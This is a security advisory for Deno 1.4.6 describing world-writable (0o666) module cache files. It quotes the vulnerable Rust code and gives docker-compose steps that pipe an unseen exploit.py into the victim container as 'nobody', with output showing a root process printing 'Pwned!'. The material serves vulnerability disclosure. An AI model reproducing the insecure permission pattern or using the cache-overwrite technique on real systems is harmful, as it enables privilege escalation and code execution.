# Deno v1.4.6 Insecure Permissions for Modules

This document describes ['CWE-732: Incorrect Permission Assignment for Critical Resource'](https://cwe.mitre.org/data/definitions/732.html) found in [Deno](https://deno.land/) v1.4.6.

## Summary

Deno 1.4.6 has Insecure Permissions. An attacker can execute arbitrary JavaScript or TypeScript code at the privilege level of the application by overwriting cache of modules.

## Details

Here is the code for writing content of HTTP response out to the filesystem.

- [`HttpCache::set`](https://github.com/denoland/deno/blob/26639b3bac463768c65f7fc40a1c53317549e1eb/cli/http_cache.rs#L149-L169)

    ```rust
    impl HttpCache {
      ...
      pub fn set(
        &self,
        url: &Url,
        headers_map: HeadersMap,
        content: &[u8],
      ) -> Result<(), AnyError> {
        let cache_filename = self.location.join(url_to_filename(url));
        // Create parent directory
        let parent_filename = cache_filename
          .parent()
          .expect("Cache filename should have a parent dir");
        self.ensure_dir_exists(parent_filename)?;
        // Cache content
        deno_fs::write_file(&cache_filename, content, 0o666)?;                    // [[ 1 ]]

        let metadata = Metadata {
          url: url.to_string(),
          headers: headers_map,
        };
        metadata.write(&cache_filename)
      }
    }
    ```

As shown above, the permission of the cache is set to world-writable at [[ 1 ]]. It could be exploited for privilege escalation by an attacker who has write access right on the filesystem.

`DiskCache::set` has the same issue at [[ 2 ]].

- [`DiskCache::set`](https://github.com/denoland/deno/blob/26639b3bac463768c65f7fc40a1c53317549e1eb/cli/disk_cache.rs#L141-L149)

    ```rust
    impl DiskCache {
      ...
      pub fn set(&self, filename: &Path, data: &[u8]) -> std::io::Result<()> {
        let path = self.location.join(filename);
        match path.parent() {
          Some(ref parent) => self.ensure_dir_exists(parent),
          None => Ok(()),
        }?;
        deno_fs::write_file(&path, data, 0o666)                                   // [[ 2 ]]
          .map_err(|e| with_io_context(&e, format!("{:#?}", &path)))
      }
    }
    ```

## Exploitation

There is a service that executes [welcome module](https://deno.land/std@0.74.0/examples/welcome.ts) in std@0.74.0 forever. We can reproduce the issue with the following instructions.

1. Build the services.

    ```sh
    docker-compose build
    ```

2. Launch the services.

    ```sh
    docker-compose up
    ```

3. Open a new terminal and overwrite the welcome module with the generated command by exploit.py as **'nobody'** user.

    ```sh
    cd attacker
    # Usage: python exploit.py DENO_DIR MODULE_URL
    python exploit.py /usr/local/share/deno https://deno.land/std@0.74.0/examples/welcome.ts | docker-compose exec -T -u nobody victim sh
    ```

A sample output of `docker-compose up` is shown below. Note that the victim process is running at the privilege of 'root' but 'nobody' user succeeded taking over.

- A sample output of demonstartion of PoC

    ```none
    % COMPOSE_DOCKER_CLI_BUILD=1 DOCKER_BUILDKIT=1 docker-compose up
    WARNING: Native build is an experimental feature and could change at any time
    Creating network "2020-10-21_deno-146-world-writable-modules-by-default_default" with the default driver
    Creating 2020-10-21_deno-146-world-writable-modules-by-default_victim_1 ... done
    Attaching to 2020-10-21_deno-146-world-writable-modules-by-default_victim_1
    victim_1  | Welcome to Deno 🦕
    victim_1  | Welcome to Deno 🦕
    victim_1  | Welcome to Deno 🦕
    victim_1  | Check https://deno.land/std@0.74.0/examples/welcome.ts
    victim_1  | Welcome to Deno 🦕
    victim_1  | Pwned!
    victim_1  | Welcome to Deno 🦕
    victim_1  | Pwned!
    ^CGracefully stopping... (press Ctrl+C again to force)
    Stopping 2020-10-21_deno-146-world-writable-modules-by-default_victim_1 ... done
    ```
